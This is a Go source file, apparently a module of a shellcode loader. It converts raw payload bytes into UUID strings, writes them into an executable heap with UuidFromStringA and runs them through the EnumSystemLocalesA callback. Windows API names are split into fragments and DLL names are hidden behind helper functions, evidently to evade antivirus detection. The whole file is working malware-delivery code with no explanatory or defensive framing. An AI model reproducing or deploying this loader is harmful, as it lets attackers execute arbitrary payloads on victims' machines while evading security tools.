package loader

import (
	"bytes"
	"upx/utils"
	"encoding/binary"
	"unsafe"
	"github.com/google/uuid"
)

func RunUuidForm(code []byte) {
	if 16-len(code)%16 < 16 {
		pad := bytes.Repeat([]byte{byte(0x90)}, 16-len(code)%16)
		code = append(code, pad...)
	}
	var uuids []string
	for i := 0; i < len(code); i += 16 {
		var uuidBytes []byte
		buf := make([]byte, 4)
		binary.LittleEndian.PutUint32(buf, binary.BigEndian.Uint32(code[i:i+4]))
		uuidBytes = append(uuidBytes, buf...)
		buf = make([]byte, 2)
		binary.LittleEndian.PutUint16(buf, binary.BigEndian.Uint16(code[i+4:i+6]))
		uuidBytes = append(uuidBytes, buf...)
		buf = make([]byte, 2)
		binary.LittleEndian.PutUint16(buf, binary.BigEndian.Uint16(code[i+6:i+8]))
		uuidBytes = append(uuidBytes, buf...)
		uuidBytes = append(uuidBytes, code[i+8:i+16]...)
		u, _ := uuid.FromBytes(uuidBytes)
		uuids = append(uuids, u.String())
	}

	kerl32 := utils.GetWinDLL(utils.GetKe32Name())
	rpcrt4 := utils.GetWinDLL(utils.GetRpc4Name())
	heapCreate := kerl32.NewProc("Heap" + "Create")
	heapAllc := kerl32.NewProc("Heap" + "Alloc")
	enumSysLocalA := kerl32.NewProc("Enum" + "System" + "Locales" + "A")
	uuidString := rpcrt4.NewProc("Uuid" + "From" + "String" + "A")
	heapAddr, _, _ := heapCreate.Call(0x00040000, 0, 0)
	addr, _, _ := heapAllc.Call(heapAddr, 0, 0x00100000)
	addrPtr := addr
	for _, temp := range uuids {
		u := append([]byte(temp), 0)
		_, _, _ = uuidString.Call(uintptr(unsafe.Pointer(&u[0])), addrPtr)
		addrPtr += 16
	}
	_, _, _ = enumSysLocalA.Call(addr, 0)
}
